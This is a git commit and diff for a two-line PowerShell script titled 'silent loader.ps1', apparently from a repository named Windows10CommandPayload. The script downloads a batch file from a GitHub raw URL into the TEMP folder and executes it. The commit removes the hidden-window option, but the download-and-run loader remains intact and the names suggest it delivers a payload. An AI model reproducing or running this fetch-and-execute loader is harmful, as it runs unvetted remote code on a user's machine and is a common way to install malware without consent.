4c5cc208f1d356c1015dd57d92e36c7d4fab351d
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-09-20 23:04:47 +0200

    Update silent loader.ps1

--- silent loader.ps1
+++ silent loader.ps1
@@ -1,2 +1,2 @@
 iwr -useb "https://raw.githubusercontent.com/Dazd-Pkz/Windows10CommandPayload/main/script.bat" -o $env:TEMP\script.bat
-Start-Process -WindowStyle hidden -FilePath $env:TEMP\script.bat
+Start-Process -FilePath $env:TEMP\script.bat
